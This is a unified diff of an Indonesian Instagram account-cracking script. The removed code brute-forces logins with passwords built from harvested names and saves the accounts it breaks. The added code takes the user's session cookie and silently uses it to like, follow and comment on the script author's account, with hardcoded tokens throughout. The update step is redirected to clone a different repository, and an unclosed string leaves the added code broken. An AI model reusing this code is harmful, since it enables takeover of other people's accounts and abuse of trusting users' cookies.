@@ -1,322 +1,66 @@
-#!/usr/bin/python2
-# coding=utf-8
-# Author: Ardinal
-# Tool Instaram
-# Versi 0.5
-a = "\033[96;1m"
-p = "\033[97;1m"
-h = "\033[92;1m"
-k = "\033[93;1m"
-m = "\033[91;1m"
-d = "\033[90;1m"
-import os
-try:
-	import concurrent.futures
-except ImportError:
-	print k+"\n Modul Futures blom terinstall!..."
-	os.system("pip install futures" if os.name == "nt" else "pip2 install futures")
-try:
-	import requests
-except ImportError:
-	print k+"\n Modul Requests blom terinstall!..."
-	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")
-
-import os, requests, re, json, random, sys, platform, base64,datetime, subprocess, time
-from calendar import monthrange
-from concurrent.futures import ThreadPoolExecutor
-
-garis = h+"+++>"
-
-data_= []
-hasil_ok = []
-hasil_cp = []
-c=1
-
-status_foll =[]
-data_followers = []
-pencarian_ = []
-platform_dev = str(platform.platform()).lower()
-p1 = base64.b64encode(platform_dev)
-
-try:
-	has_ok = open("hasil_ok.txt", "r").readlines()
-	with open("hasil_ok.txt", "w") as tul:
-		tul.write("")
-	for dev in set(has_ok):
-		with open("hasil_ok.txt", "a") as tu:
-			tu.write(dev)
-except:
-	pass
-try:
-	has_cp = open("hasil_cp.txt", "r").readlines()
-	with open("hasil_cp.txt", "w") as tul:
-		tul.write("")
-	for dev in set(has_cp):
-		with open("hasil_cp.txt", "a") as tu:
-			tu.write(dev)
-except:
-	pass
-url_instagram = "https://www.instagram.com/"
-user_agentz = "ua"
-user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
-user_agentz_qu = [g]
-headerz = {"User-Agent": user_agentz}
-headerz_api = {"User-Agent": user_agentz_api}
-
-def hapus_cookie():
-	try:
-		os.system("del cookie.txt" if os.name == "nt" else "rm -f cookie.txt")
-	except:
-		pass
-def hapus_cokiz():
-	try:
-		os.system("del cokiz.txt" if os.name == "nt" else "rm -f cokiz.txt")
-	except:
-		pass
-
-def cek_hasil():
-	print garis
-	print h+" >"+k+" 1"+p+". Cek Hasil "+h+"OK/Live"
-	print h+" >"+k+" 2"+p+". Cek Hasil "+k+"Checkpoint"
-	print garis
-	while True:
-		pil = raw_input(a+" ? "+p+"Pilih"+h+": ")
-		if pil == "1":
-			try:
-				hasil_ok_ = open("hasil_ok.txt", "r").readlines()
-				print k+"\n >_"+p+" Menampilkan Hasil "+h+"Live\n"
-				for dev in hasil_ok_:
-					ok = dev.replace("\n", "").split("==>")
-					print a+"  {"+k+"Live"+a+"} "+h+ok[1]+a+" | "+p+ok[3]
-				print h+"\n >_< "+p+"Jumlah"+k+": "+str(len(hasil_ok_))
-			except:
-				print k+"\n Belum ada hasil"+h+" OK"
-			break
-		elif pil == "2":
-			try:
-				hasil_cp_ = open("hasil_cp.txt", "r").readlines()
-				print k+"\n >_"+p+" Menampilkan Hasil "+k+"Checkpoint\n"
-				for dev in hasil_cp_:
-					cp = dev.replace("\n", "").split("==>")
-					print a+"  {"+p+"Chek"+a+"} "+k+cp[1]+a+" | "+d+cp[3]
-				print h+"\n >_< "+p+"Jumlah"+k+": "+str(len(hasil_cp_))
-			except:
-				print k+"\n Belum ada hasil"+p+" CP"
-			break
-		else:
-			pass
-
-def cek_login():
-	global cookie
-	try:
-		cok = open("cookie.txt", "r").read()
-	except IOError:
-		login_dev()
-
-	else:	
-		url = "https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5"
-		with requests.Session() as ses_dev:
-			try:
-				login_coki = ses_dev.get(url, cookies={"cookie": cok}, headers=headerz_api)
-				if "users" in json.loads(login_coki.content):
-					cookie = {"cookie": cok}
-				else:
-					print m+"\n Cookie Kedaluarsa...\n"
-					hapus_cookie()
-					login_dev()	
-			except ValueError:
-				print m+"\n Cookie Kedaluarsa...\n"
-				hapus_cookie()
-				login_dev()
-
-def login_dev_cookie():
-	global cookie
-	print "\n  Login Instagram\n"
-	cok = raw_input(" Masukkan Cookie: ")
-	with requests.Session() as ses_dev:
-		login_coki = ses_dev.get(url_instagram, cookies={"cookie": cok}, headers=headerz)
-		if "viewer_has_liked" in str(login_coki.content):
-			print " Login Suksess...."
-			with open("cookie.txt", "w") as tulis_coki:
-				tulis_coki.write(cok)
-			cookie = {"cookie": cok}
-		else:
-			print " Login gagal...."
-			exit()
-
-
-def data_pencarian_dev(cookie, nama, limit):
-	url = "https://www.instagram.com/web/search/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true".format(limit,nama)
-	with requests.Session() as ses_dev:
-		res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
-		for dev in json.loads(res_dat_pencarian.content)["users"]:
-			users = dev["user"]
-			print " Username:",users["username"]
-			print " Nama:",users["full_name"].encode("utf-8")
-			print "-"*50
-
-
-def crack():
-	with ThreadPoolExecutor(max_workers=30) as insta_dev:
-		for dataku in data_:
-			try:
-				pw = []
-				data = dataku.encode("utf-8")
-				dat_ = data.split("==>")[0]
-				pw_ = data.split("==>")[1]
-				pw_nam = pw_.split()
-
-				if len(pencarian_) != 1:
-					if len(dat_) >= 6:
-						pw.append(dat_)
-						if len(pw_nam[0]) <= 2:
-							if len(pw_nam) >= 2:
-								pw.append(pw_nam[0]+pw_nam[1])
-							if len(pw_) >= 6:
-								pw.append(pw_)
-
-						else:
-							pw.append(pw_nam[0]+"123")
-							if len(pw_nam) >= 2:
-								pw.append(pw_nam[0]+pw_nam[1])
-							if len(pw_) >= 6:
-								pw.append(pw_)
+    	
 		
-					else:
-						# pw.append(dat_+dat_)
-						if len(pw_nam[0]) <= 2:
-							if len(pw_nam) >= 2:
-								pw.append(pw_nam[0]+pw_nam[1])
-							if len(pw_) >= 6:
-								pw.append(pw_)
 
-						else:
-							if len(pw_nam) >= 2:
-								pw.append(pw_nam[0]+pw_nam[1])
-							pw.append(pw_nam[0]+"123")
-							if len(pw_) >= 6:
-								pw.append(pw_)
-				else:
-					pw.append(pw_nam[0]+"123")
-					# pw.append(pw_nam[0]+"12345")
-					pw.append(dat_)
-
-				insta_dev.submit(crack_dev, dat_, pw)
-			except:
-				pass
-def auto_follow():
-	data_ok = open("hasil_ok.txt", "r").readlines()
-	for dev in data_ok:
-		pecah = dev.split("==>")[1]
-		if pecah not in data_followers:
-			print "\r >- Yang Belum Mengikuti: {}".format(len(data_)),
-			sys.stdout.flush()
-			data_.append(dev)
-	print "\n"
-	with ThreadPoolExecutor(max_workers=3) as insta_foll:
-		for data_foll in data_:
-			data_foll_ = data_foll.replace("\n", "")
-			us_foll = data_foll_.split("==>")[1]
-			pw_foll =data_foll_.split("==>")[3]
-			insta_foll.submit(crack_dev, us_foll, pw_foll)
-
-c_foll = 1
-count_foll = 1
-def follow_dev(ses_dev, username_dev):
-	global c_foll, count_foll
-	if len(status_foll) != 1:
-		user_target = "iqbaldev"
-		id_target = "12629128399"
-	else:
-		print h+"\r >>> Follow {}/{}|Chek+{}/Live+{}  ".format(str(count_foll),len(data_),len(hasil_cp), len(hasil_ok)),
-		sys.stdout.flush()
-		user_target = username_get_follow
-		id_target = id_
-
-	dat_crf_foll = ses_dev.get("https://www.instagram.com/{}/".format(user_target), headers=headerz_api).content
-	crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
-	headerz_foll = {"Accept": "*/*",
-					"Accept-Encoding": "gzip, deflate, br",
-					"Accept-Language": "en-US,en;q=0.5",
-					"Host": "www.instagram.com",
-					"Origin": "https://www.instagram.com",
-					"Referer": "https://www.instagram.com/{}/".format(user_target),
-					"User-Agent": user_agentz,
-					"X-CSRFToken": crf_token_foll}
-	param_foll = {""}
-	url_follow = "https://www.instagram.com/web/friendships/{}/follow/".format(id_target)
-	res_foll = ses_dev.post(url_follow, headers=headerz_foll)
-	if len(status_foll) != 1:
-		pass
-	else:
-		print h+"\r ["+k+">-"+h+"] "+p+str(c_foll)+" "+k+username_dev+h+" Sukses Mengikuti "+p+user_target+k+" >_< Wkwwkwkw\n"
-		c_foll+=1
-		count_foll+=1
-None
-def login_dev():
-	global cookie
-	print ""
-	print a+"  {"+p+" Login Instagram "+a+"}"
-	print m+"   ----------------"
-	print garis
-	username_dev = raw_input(a+" ?"+p+" Masukkan Username"+h+": ")
-	pass_dev = raw_input(a+" ?"+p+" Masukkan  Sandi"+d+": ")
-	try:
-		try:
-			headerz = {"User-Agent": user_agentz}
-			with requests.Session() as dev:
-				url_scrap = "https://www.instagram.com/"
-				data = dev.get(url_scrap, headers=headerz).content
-				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
-			header = {
-					"Accept": "*/*",
-					"Accept-Encoding": "gzip, deflate, br",
-					"Accept-Language": "en-US,en;q=0.5",
-					"Host": "www.instagram.com",
-					"X-CSRFToken": crf_token,
-					"X-Requested-With": "XMLHttpRequest",
-					"Referer": "https://www.instagram.com/accounts/login/",
-					"User-Agent": user_agentz,
-					 }
-			param = {
-					"username": username_dev,
-					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), pass_dev),
-					"optIntoOneTap": False,
-					"queryParams": {},
-					"stopDeletionNonce": "",
-					"trustedDeviceRecords": {}
-					}
-		except:
-			header = {}
-			param = {}
-			pass
-		with requests.Session() as ses_dev:
-			url = "https://www.instagram.com/accounts/login/ajax/"
-			respon = ses_dev.post(url, data=param, headers=header)
-			data_dev = json.loads(respon.content)
-			da = respon.cookies.get_dict()
-
-			if "userId" in str(data_dev):
-				print p+"\n *"+h+" Suksess Login.."
-				for dev in da:
-					with open("cookie.txt", "a") as tulis:
-						tulis.write(dev+"="+da[dev]+";")
-				follow_dev(ses_dev, username_dev)
-				cok = open("cookie.txt","r").read()
-				cookie = {"cookie": cok}
-
-			elif "checkpoint_url" in str(data_dev):
-				print k+"\n Akun Cp"
-
-			elif "Please wait" in str(data_dev):
-				print m+" >>> Mainkan Mode Pesawat!! >>"
-
-			else:
-				print m+"\n Gagal Login...."
-				exit()
 				
-	except KeyboardInterrupt:
-		exit()
+
+import os, re, sys, time, json, random, requests
+from concurrent.futures import ThreadPoolExecutor
+from requests.exceptions import ConnectionError
+from time import sleep
+
+# Warna
+H = ('\x1b[1;90m')
+M = ('\x1b[1;91m')
+H = ('\x1b[1;92m')
+K = ('\x1b[1;93m')
+T = ('\x1b[1;94m')
+U = ('\x1b[1;95m')
+B = ('\x1b[1;96m')
+P = ('\x1b[1;97m')
+
+# Logo
+___logo___ = (f""" WELLCOME COK!
+{K}[{P}•{K}]{P} LOGO COMMINGSON!
+
+# Login Cookie
+def ___login___():
+    os.system('clear')
+    print(___logo___)
+    print(f"{B}[{P}•{B}]{P} Masukan Cookie Instagram, Sebaiknya Jangan Gunakan Akun Yang Baru Di Buat, Kalau Anda Belum Mengetahui Cara Mendapatkan Cookie Instagram Ketik {M}[{P}Open{M}]{P}\n")
+    ___cookie = input(f"{H}[{P}?{H}]{P} Cookie :{K} ")
+    if ___cookie in ['open', 'Open', 'OPEN']:
+        print(f"{K}[{P}!{K}]{P} Anda Akan Diarahkan Ke Youtube, Silahkan Ikuti Cara Untuk Mendapatkan Cookie...");sleep(3);os.system('xdg-open www.facebook.com/Zeeee.utama');exit()
+    elif ___cookie in ['', ' ']:
+        exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
+    else:
+        try:
+            ___userid = re.search('ds_user_id=(.*?);', ___cookie);open('Data/user.txt', 'w').write(___userid.group(1))
+            ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': ___cookie}).json()['user'];open('Data/coki.txt', 'w').write(___cookie)
+            print(f"{H}[{P}*{H}]{P} Welcome :{K} {___roz['full_name']}");___follow___()
+        except (AttributeError, KeyError):
+            exit(f"{P}[{M}!{P}]{M} Pastikan Cookie Sudah Benar")
+        except (ConnectionError):
+            exit(f"{P}[{K}!{P}]{K} Koneksi Error")
+
+# Follow Cookie
+def ___follow___():
+    try:
+        ___cookie = open('Data/coki.txt', 'r').read()
+        ___session = re.search('sessionid=(.*?);', ___cookie)
+        ___teks = random.choice(['Hallo Bang 😍','Hai Bang Apa Kabar 😎','Izin Pake Scriptnya 😁','Mantap Bang 😘','Programmer Bang 🤔','Salam Kenal Bang 🤗','I Love You ❤️'])
+        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
+        with requests.Session() as ses:
+            ___like = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
+            ___follow = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
+            ___komen = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}, data = ___data).text #Jangan Di ubah!
+            if '"status":"ok"' in str(___follow):
+                print(f"{H}[{P}!{H}]{P} Login Berhasil");___menu___()
+            else:
+                print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
+    except Exception as e:
+        print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
+        
+
 None
 def data_follower_dev(cookie, id_target, limit, opsi):
 	global c
@@ -587,7 +331,7 @@ def pilihan(pil):
 	elif pil == "6":
 		import os
 		try:
-			os.system("git clone https://github.com/IqbalDev/insta_dev")
+			os.system("git clone https://github.com/zecasper/Projectigrekod")
 			os.system("rm -rf insta_dev.py")
 			os.system("cp -f insta_dev/insta_dev.py \\.")
 			os.system("rm -rf insta_dev")
@@ -666,7 +410,6 @@ versi = k+" >_"+h+" Versi_:"+p+" 0.1\n"
 if __name__=="__main__":
 	cek_login()
 	menu_dev()
-
 
 
 
